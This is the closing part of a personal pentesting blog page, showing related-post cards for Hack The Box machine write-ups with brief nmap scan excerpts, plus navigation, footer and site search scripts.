class="card-deck mb-4"><div class="card"> <a href="/pentesting/htb/machines/traverxec"><div class="card-body"> <em class="small" data-ts="1672527600" data-df="ll" > Jan 1, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB | Traverxec</h3><div class="text-muted small"><p> Fingerprint Scan The scan show: 1 2 3 4 5 6 7 8 9 10 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa99a81668cd41ccf96...</p></div></div></a></div><div class="card"> <a href="/pentesting/htb/machines/paper"><div class="card-body"> <em class="small" data-ts="1653084000" data-df="ll" > May 21, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB | Paper</h3><div class="text-muted small"><p> Enumeration nmap ❯ nmap -sVC 10.10.11.143 -oN nmap Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 18:04 CEST Nmap scan report for 10.10.11.143 Host is up (0.28s latency). Not shown: 997 ...</p></div></div></a></div><div class="card"> <a href="/pentesting/htb/machines/late"><div class="card-body"> <em class="small" data-ts="1653861600" data-df="ll" > May 30, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB | Late</h3><div class="text-muted small"><p> Enumeration After the ping we can guess that is a Linux. The ports scan give us: # Nmap 7.92 scan initiated Sat May 28 20:31:36 2022 as: nmap -p- -sS --min-rate 5000 -oG ports 10.10.11.156 Host: 10...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/pentesting/htb/machines/late" class="btn btn-outline-primary" prompt="Older"><p>HTB | Late</p></a> <a href="/pentesting/htb/machines/outdated" class="btn btn-outline-primary" prompt="Newer"><p>HTB | Oudated</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/giangkhail12999">Cong Khai NGUYEN</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" rel="noopener">Jekyll</a> with <a href="#" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/rootme/">rootme</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/hard/">hard</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/unregister.js"></script>
